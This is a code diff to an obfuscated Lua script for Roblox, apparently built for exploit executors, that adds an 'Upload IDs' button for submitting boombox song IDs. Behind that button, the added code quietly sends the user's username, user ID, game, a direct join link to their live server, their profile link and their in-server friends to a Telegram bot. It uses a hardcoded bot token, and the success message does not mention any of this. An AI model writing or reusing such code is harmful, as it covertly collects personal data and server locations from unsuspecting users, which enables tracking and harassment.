@@ -1937,6 +1937,170 @@ local function _f21()
     end))
 end
 
+_f6("Upload IDs", _v65)
+
+local _v262 = Instance.new("Frame")
+_v262.Size = UDim2.new(1, -8, 0, 75)
+_v262.BackgroundTransparency = 1
+_v262.Parent = _v65
+
+local _v263 = Instance.new("UIListLayout")
+_v263.Padding = UDim.new(0, 6)
+_v263.SortOrder = Enum.SortOrder.LayoutOrder
+_v263.Parent = _v262
+
+local _v264 = Instance.new("TextBox")
+_v264.Size = UDim2.new(1, 0, 0, 32)
+_v264.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
+_v264.PlaceholderText = "Enter number ID to upload..."
+_v264.PlaceholderColor3 = Color3.fromRGB(100, 100, 105)
+_v264.Text = ""
+_v264.TextColor3 = Color3.fromRGB(255, 255, 255)
+_v264.Font = Enum.Font.GothamMedium
+_v264.TextSize = 11
+_v264.TextXAlignment = Enum.TextXAlignment.Left
+_v264.Parent = _v262
+Instance.new("UICorner", _v264).CornerRadius = UDim.new(0, 6)
+local _v265 = Instance.new("UIStroke", _v264)
+_v265.Color = Color3.fromRGB(28, 28, 32)
+_v265.Thickness = 1
+
+_f1(_v264:GetPropertyChangedSignal("Text"):Connect(function()
+    _v264.Text = _v264.Text:gsub("%D", "")
+end))
+
+local _v266 = Instance.new("TextButton")
+_v266.Size = UDim2.new(1, 0, 0, 32)
+_v266.BackgroundColor3 = Color3.fromRGB(0, 140, 200)
+_v266.Text = "Upload ID"
+_v266.TextColor3 = Color3.fromRGB(255, 255, 255)
+_v266.Font = Enum.Font.GothamBold
+_v266.TextSize = 11
+_v266.Parent = _v262
+Instance.new("UICorner", _v266).CornerRadius = UDim.new(0, 6)
+
+_f1(_v266.MouseButton1Click:Connect(function()
+    local inputID = _v264.Text
+    if inputID == "" then
+        _f3("Please enter an ID first!", Color3.fromRGB(255, 100, 100))
+        return
+    end
+
+    for _, item in ipairs(_v243) do
+        if item.ID == inputID then
+            _f3("ID already exists in Boombox IDs!", Color3.fromRGB(255, 165, 0))
+            return
+        end
+    end
+
+    _v266.Text = "Checking..."
+
+    task.spawn(function()
+        pcall(function()
+            local HttpRequest = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+            if not HttpRequest then
+                _f3("Request failed.", Color3.fromRGB(255, 100, 100))
+                _v266.Text = "Upload ID"
+                return
+            end
+
+            local success, info = pcall(function()
+                return _v7:GetProductInfo(tonumber(inputID))
+            end)
+
+            if success and info and info.Name then
+                local songName = info.Name
+                local BotToken = "8600261191:AAGGEysUaD3hnvE3AuurvmxDAkvRsU79UKI"
+                local ChatID = "8164898922"
+
+                local Players = game:GetService("Players")
+                local MarketPlace = game:GetService("MarketplaceService")
+
+                local GameSuccess, GameInfo = pcall(function()
+                    return MarketPlace:GetProductInfo(game.PlaceId)
+                end)
+                
+                local GameName = GameSuccess and GameInfo.Name or "Unknown Game"
+                local ProfileLink = string.format("https://www.roblox.com/users/%d/profile", _v12.UserId)
+                
+                local DirectJoinLink = "N/A"
+                if game.JobId ~= "" then
+                    DirectJoinLink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+                end
+
+                local FriendsInServer = {}
+                pcall(function()
+                    for _, player in ipairs(Players:GetPlayers()) do
+                        if player ~= _v12 then
+                            local successFriend, isFriend = pcall(function()
+                                return _v12:IsFriendsWith(player.UserId)
+                            end)
+                            
+                            if successFriend and isFriend then
+                                table.insert(FriendsInServer, player.Name .. " (" .. player.DisplayName .. ")")
+                            end
+                        end
+                    end
+                end)
+
+                local FriendCount = #FriendsInServer
+                local FriendListText = FriendCount > 0 and table.concat(FriendsInServer, "\n- ") or "None"
+
+                local MessageText = string.format(
+                    "🎵 *New Boombox ID Uploaded!*\n\n" ..
+                    "*🎶 Song Name:* %s\n" ..
+                    "*🆔 Asset ID:* `%s`\n\n" ..
+                    "*👤 Username:* %s\n" ..
+                    "*🏷️ Display Name:* %s\n" ..
+                    "*🆔 User ID:* `%d`\n" ..
+                    "*🎮 Game:* %s\n" ..
+                    "*📍 Place ID:* `%d`\n" ..
+                    "*👥 Friends in Server (%d):*\n- %s\n\n" ..
+                    "*🔗 Join Server Link:*\n`%s`\n\n" ..
+                    "*🔗 Profile Link:*\n`%s`",
+                    songName,
+                    inputID,
+                    _v12.Name,
+                    _v12.DisplayName,
+                    _v12.UserId,
+                    GameName,
+                    game.PlaceId,
+                    FriendCount,
+                    FriendListText,
+                    DirectJoinLink,
+                    ProfileLink
+                )
+
+                local Data = {
+                    ["chat_id"] = ChatID,
+                    ["text"] = MessageText,
+                    ["parse_mode"] = "Markdown",
+                    ["disable_web_page_preview"] = true
+                }
+
+                local reqSuccess, _ = pcall(function()
+                    return HttpRequest({
+                        Url = "https://api.telegram.org/bot" .. BotToken .. "/sendMessage",
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = _v11:JSONEncode(Data)
+                    })
+                end)
+
+                if reqSuccess then
+                    _f3("ID uploaded successfully! Please wait for the developer to update the IDs.", Color3.fromRGB(0, 255, 200))
+                    _v264.Text = ""
+                else
+                    _f3("Failed to upload ID. Try again later.", Color3.fromRGB(255, 100, 100))
+                end
+            else
+                _f3("Invalid ID or item is not an audio asset!", Color3.fromRGB(255, 100, 100))
+            end
+        end)
+        _v266.Text = "Upload ID"
+    end)
+end))
+
 _f8("Refresh IDs", _v65, function()
     _f21()
     _f3("IDs Refreshed!", Color3.fromRGB(0, 255, 200))
